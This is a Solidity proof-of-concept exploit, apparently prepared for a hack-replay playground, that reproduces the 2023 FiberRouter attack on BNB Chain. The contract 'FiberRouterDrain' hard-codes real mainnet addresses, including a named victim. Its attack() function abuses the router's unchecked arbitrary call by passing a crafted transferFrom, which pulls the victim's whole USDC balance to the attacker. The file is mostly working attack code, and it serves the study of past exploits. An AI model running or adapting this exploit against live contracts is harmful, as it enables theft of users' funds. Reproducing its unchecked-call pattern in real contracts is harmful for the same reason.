// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-11-FiberRouter).
// The original DeFiHackLabs PoC (test/FiberRouter_exp.sol) runs the attack INLINE
// on the Foundry test contract itself (`attack()` on `ContractTest`, attacker ==
// address(this)) and only uses one cheatcode: `deal(wbnb, address(this), 1 ether)`
// in setUp(). That dealt WBNB balance is never actually spent by attack() (the
// dust swap below sends native BNB via `{value: ...}`, not a WBNB pull), so it is
// dropped here as dead weight — the replay engine has no cheatcodes at all, so we
// translate the rest into a standalone, cheatcode-free contract and fund it with
// native BNB via the config's `setup` block instead of `deal`.
//
// TX: https://app.blocksec.com/explorer/tx/bsc/0x7260ad0e4769ae68f0a680356c63140353c18d7be1b86a8c4e99a0fc3b6842c1
// Root cause (see evm-hack-registry/2023-11-FiberRouter_exp/FiberRouter_exp.md):
// FiberRouter._swapAndCrossOneInch() makes an unchecked, attacker-controlled
// `address(swapRouter).call(_calldata)`. Passing swapRouter = USDC and
// _calldata = transferFrom(victim, attacker, victimBalance) makes USDC see the
// caller as FiberRouter, which holds the victim's standing approval - so the
// "swap" is really an arbitrary transferFrom of someone else's tokens.

interface IERC20Min {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakeRouterMin {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface IFiberRouterMin {
    function swapAndCrossOneInch(
        address swapRouter,
        uint256 amountIn,
        uint256 amountCrossMin, // amountOutMin on uniswap
        uint256 crossTargetNetwork,
        address crossTargetToken,
        address crossTargetAddress,
        uint256 swapBridgeAmount,
        bytes memory _calldata,
        address fromToken,
        address foundryToken
    ) external;
}

contract FiberRouterDrain {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IPancakeRouterMin constant pancakeRouter = IPancakeRouterMin(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20Min constant usdc = IERC20Min(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IFiberRouterMin constant fiberrouter = IFiberRouterMin(0x4826e896E39DC96A8504588D21e9D44750435e2D);
    address constant victim = 0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a;
    address constant crossToken = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;

    // Accepts the setup-phase native BNB funding transfer (config `setup.steps`
    // rawCall) so this contract can cover the dust swap's msg.value.
    receive() external payable {}

    function attack() external {
        uint256 victimBalance = usdc.balanceOf(victim);

        // Seed dust: swap a tiny amount of native BNB for USDC, sent directly to
        // FiberRouter, so the trailing FundManager.swapToAddress(amountCrossMin=1)
        // call below does not revert for lack of a local USDC balance.
        address[] memory swapPath = new address[](2);
        swapPath[0] = WBNB;
        swapPath[1] = address(usdc);
        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(
            1, swapPath, address(fiberrouter), block.timestamp + 20
        );

        // Craft the malicious "swap" calldata: instead of a real 1inch swap, this
        // is a raw transferFrom pulling the victim's entire USDC balance to us.
        bytes memory maliciousCalldata = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, address(this), victimBalance
        );

        // swapRouter = USDC itself, so FiberRouter's unchecked
        // `address(swapRouter).call(_calldata)` executes USDC.transferFrom(victim,
        // us, victimBalance) with FiberRouter as the caller - which holds the
        // victim's standing approval.
        fiberrouter.swapAndCrossOneInch(
            address(usdc),
            0,
            1,
            43_114,
            crossToken,
            crossToken,
            0,
            maliciousCalldata,
            address(usdc),
            address(usdc)
        );
    }
}
